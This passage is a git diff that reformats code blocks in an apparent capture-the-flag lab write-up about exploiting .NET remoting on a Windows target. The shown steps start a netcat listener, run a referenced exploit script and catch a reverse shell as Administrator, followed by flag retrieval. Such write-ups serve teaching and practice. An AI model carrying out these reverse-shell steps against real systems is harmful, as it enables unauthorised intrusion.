@@ -143,15 +143,19 @@ Remote system type is Windows_NT.
 - Looking at the `nmap` results from earlier we do have .NET remoting running on port 17001. As such this exploit should be applicable to the target machine.
 - Exploit configuration . We just need to update target ip (HOST) and our machine ip (LHOST) in the script.
 - Then we need to start a netcat listener to get reverse shell.
-```python
+
+```bash
 nc -lvnp 4444
 ```
+
 - After starting the listener, we can execute the exploit to get reverse shell.
+
 ```python
 python3 49216
 ```
 - We will get the shell in our netcat listener as **Administrator**
-```python
+
+```bash
 nc -lvnp 4444 
 listening on [any] 4444 ...
 connect to [192.168.49.53] from (UNKNOWN) [192.168.53.65] 49906
@@ -164,7 +168,8 @@ PS C:\Windows\system32>
 
 ## Flag Extraction
 - Now we can just navigate to **C:\Users\Administrator\Desktop** and read the flag inside **proof.txt** file.
-```python
+
+```bash
 PS C:\Users\Administrator\Desktop> ls
 
 
